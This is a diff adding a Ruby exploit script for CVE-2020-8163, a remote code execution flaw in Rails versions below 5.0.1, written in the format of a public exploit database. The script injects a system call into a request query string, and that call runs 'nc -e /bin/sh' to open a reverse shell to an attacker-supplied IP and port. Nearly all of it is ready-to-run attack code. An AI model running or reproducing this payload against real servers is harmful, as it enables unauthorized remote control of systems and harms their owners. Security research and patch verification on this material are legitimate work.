@@ -1,0 +1,32 @@
+# Exploit Title: Rails 5.0.1 - Remote Code Execution
+# Date: 2020-07-19
+# Exploit Author: Lucas Amorim
+# Vendor Homepage: www.rubyonrails.org
+# Software Link: www.rubyonrails.org
+# Version: Rails < 5.0.1
+# Tested on: Linux/OSx
+# CVE : CVE-2020-8163
+# More information: https://github.com/sh286/CVE-2020-8163
+
+#!/usr/bin/ruby
+
+require 'net/http'
+
+def header
+  puts "[*] - CVE-2020-8163 - Remote code execution of user-provided local names in Rails < 5.0.1\n" 
+  puts "[*] - Author: Lucas Amorim lucas@lucasamorim.ca"
+  puts "[*] - Usage: \n"
+  puts "ruby exploit.rb <url> <ip> <port>"
+end
+if ARGV.length < 3
+  header
+  exit(-1)
+end
+
+url  = ARGV[0]
+ip   = ARGV[1]
+port = ARGV[2]
+
+puts "[*] Sending payload to #{url}"
+uri = URI(url+"?system(%27nc+-e+/bin/sh+#{ip}+#{port}%27)%3ba%23")
+Net::HTTP.get(uri)
